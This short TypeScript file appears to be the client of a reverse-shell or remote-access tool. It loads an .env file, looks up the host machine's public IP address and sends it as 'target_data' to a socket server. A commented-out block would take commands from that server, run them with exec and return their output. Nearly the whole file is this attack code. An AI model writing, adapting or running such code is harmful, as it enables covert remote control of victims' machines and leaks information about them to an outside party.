import path from 'node:path'
import { config } from 'dotenv'
import { SocketReverseServer } from './event/SocketReverseServer'
const { publicIpv4 } = require('fix-esm').require('public-ip')

async function handle (): Promise<void> {
  config({
    path: path.resolve('src', 'server-template', '.env')
  })

  const targetData = {
    ip: await publicIpv4()
  }

  SocketReverseServer.on('connect', () => {
    console.log('Server connected!')
    SocketReverseServer.emit('target_data', targetData)
  })

  // socket.on('connect', async () => {
  //   socket.on('command', (command: string) => {
  //     console.log('Receiving command: ', command)

  //     exec(command, (error: Error, stdout, stderr) => {
  //       if (error) {
  //         socket.emit('result', error.message)
  //         return
  //       }

  //       if (stderr) {
  //         socket.emit('result', stderr)
  //         return
  //       }

  //       console.log('Sending result: ', stdout)
  //       socket.emit('result', stdout)
  //     })
  //   })
  // })
}

handle().catch((error) => {
  console.error(error)
})
